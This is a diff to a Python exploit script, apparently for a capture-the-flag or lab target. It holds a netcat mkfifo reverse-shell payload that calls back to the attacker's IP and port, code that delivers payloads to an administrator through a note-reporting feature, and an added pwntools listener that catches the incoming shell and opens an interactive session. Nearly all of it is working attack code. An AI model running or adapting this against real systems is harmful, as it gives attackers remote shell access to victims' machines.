@@ -8,6 +8,7 @@ from colorama import Fore
 from time import sleep
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from bs4 import BeautifulSoup
+from pwn import *
 
 reverse_shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {local_ip} {local_port} >/tmp/f"
 
@@ -116,6 +117,18 @@ def parse_yo_response(base64_string:str):
     report_a_note(session2, note_id)
     print(f"[+] Second payload sent to administartor. Wait for reverse shell on port [{local_port}]")
 
+    start_callback_server()
+
+def initiate_call_back():
+    print(f"[+] Starting reverse shell listener on port [{local_port}] in 4..3..2..1")
+    l = listen(int(local_port))
+    conn = l.wait_for_connection()
+    conn.interactive()
+
+def start_callback_server():
+    t = threading.Thread(target=initiate_call_back)
+    t.start()
+
 def start_http_server():
     with HTTPServer(("", 80), MyHttpHandler) as server:
         server.serve_forever()
@@ -192,12 +205,12 @@ def report_a_note(thissession, this_note_id):
     response = thissession.post(url, headers=headers, data=data)
     
     if response.status_code == 200:
-        print("[+] Payload sent to administrator")
+        print("[+] Payload sent to administrator. Please wait. Be patient...")
 
 if __name__ == "__main__":
 
     if len(sys.argv) < 2:
-        print(f"{Fore.RED}[-] You forgot sending local ip and local port for callbacks")
+        print(f"{Fore.RED}[-] You forgot sending local ip and local port for reverse shell callback")
         exit()
 
     session = requests.Session()
